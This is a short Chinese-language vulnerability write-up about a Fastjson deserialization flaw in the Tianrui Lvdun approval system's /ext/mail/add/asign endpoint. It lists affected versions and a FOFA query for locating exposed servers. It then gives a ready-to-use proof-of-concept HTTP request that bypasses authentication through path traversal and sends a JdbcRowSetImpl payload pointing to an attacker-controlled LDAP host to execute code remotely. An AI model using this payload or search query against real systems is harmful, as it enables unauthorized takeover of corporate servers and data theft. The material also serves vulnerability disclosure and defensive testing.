## 天锐绿盾审批系统-/ext/mail/add/asign-fastjson反序列化漏洞

## 一、漏洞简介
天锐绿盾审批系统是一款企业级数据防泄密（DLP）解决方案，主要用于对企业内部的敏感文件进行透明加密、权限管理以及审批流程控制，旨在防止数据泄露并保障信息安全。

该系统的 /ext/mail/add/asign 接口存在 Fastjson 反序列化漏洞。攻击者可以通过构造恶意的 JSON 数据包，利用 Fastjson 库在处理数据时存在的反序列化缺陷，在未经授权的情况下，在服务器端执行任意代码。

成功利用此漏洞可能导致服务器被完全控制，攻击者可以窃取敏感数据、植入恶意程序、篡改系统配置，甚至对整个企业网络造成严重破坏，对企业的业务连续性和数据安全构成重大威胁。

## 二、影响版本
V3.53.240913

V7.05.240904

## fofa
```
app="TIPPAY-绿盾审批系统"
```

## POC
```
POST /trwfe/login.jsp/.%2e/rest/ext/mail/add/asign HTTP/1.1
Host: trwfe.mrxn.net
X-Authorization: whoami
Content-Type: application/json

{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://vpsip:50389/xxxxx",
    "autoCommit": true
}
```
